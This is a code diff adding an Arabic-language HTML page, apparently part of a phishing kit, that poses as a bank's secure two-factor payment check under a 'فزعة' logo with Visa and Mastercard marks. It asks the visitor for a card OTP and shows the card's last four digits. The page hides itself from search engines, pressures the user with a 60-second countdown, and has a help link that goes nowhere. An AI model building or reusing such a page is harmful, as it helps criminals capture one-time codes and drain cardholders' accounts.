@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>التحقق من الرمز</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style-verification.css">
+</head>
+<body>
+    <div class="app">
+        <div class="verification-shell">
+            <header>
+                <div class="logo">
+                    <img class="logo-mark" src="assets/images/logo.png" alt="فزعة">
+                </div>
+            </header>
+
+            <main>
+                <form autocomplete="one-time-code" novalidate id="verification-form">
+                    <!-- Hero Card -->
+                    <section class="hero-card">
+                        <div class="hero-card__top">
+                            <i class="fa-solid fa-shield-halved hero-card__icon" id="shieldIcon"></i>
+                            <i class="fa-brands fa-cc-visa hero-card__brand-icon hero-card__brand-icon--visa" id="visaIcon" style="display:none"></i>
+                            <img class="hero-card__bank" id="masterIcon" src="assets/images/Mastercard.svg" alt="">
+                        </div>
+                        <h1 class="hero-card__title">المصادقة الثنائية الآمنة</h1>
+                        <p class="hero-card__text">
+                            ستتلقى رمزاً سرياً لمرة واحدة (OTP) لتأكيد عملية الدفع بأمان عبر رسالة نصية،
+                            تطبيق البنك، أو مكالمة هاتفية آلية من البنك.
+                        </p>
+                    </section>
+
+                    <!-- OTP Section -->
+                    <h2 class="section-title">يرجى إدخال رمز التحقق (OTP):</h2>
+                    <p class="section-subtitle">
+                        الرمز مرسل الآن إلى رقم الهاتف المرتبط بالبطاقة •••• <span id="cardLast4Text">----</span>
+                    </p>
+
+                    <div class="field">
+                        <label class="label" for="otpCode">أدخل الرمز هنا:</label>
+                        <input 
+                            id="otpCode" 
+                            class="otp-input" 
+                            type="tel" 
+                            inputmode="numeric" 
+                            pattern="[0-9]*" 
+                            maxlength="6" 
+                            autocomplete="one-time-code" 
+                            name="one-time-code" 
+                            placeholder="• • • • • •"
+                        >
+                        <div class="otp-error" id="otpError"></div>
+                    </div>
+
+                    <button class="btn-primary" id="confirmBtn" type="button">
+                        <span id="btnText">تأكيد</span>
+                    </button>
+
+                    <!-- Timer -->
+                    <p class="timer-text">
+                        ستنتهي صلاحية هذه الصفحة تلقائياً بعد <strong id="countdownSeconds">60</strong> ثانية
+                    </p>
+                    
+                    <p class="help-text">هل تحتاج للمساعدة؟ <a href="#">تواصل معنا</a></p>
+                </form>
+            </main>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-card">
+            <div class="loading-spinner"></div>
+            <span>جاري التحقق من المعلومات، يرجى الانتظار</span>
+        </div>
+    </div>
+
+    <script src="script-verification.js"></script>
+</body>
+</html>
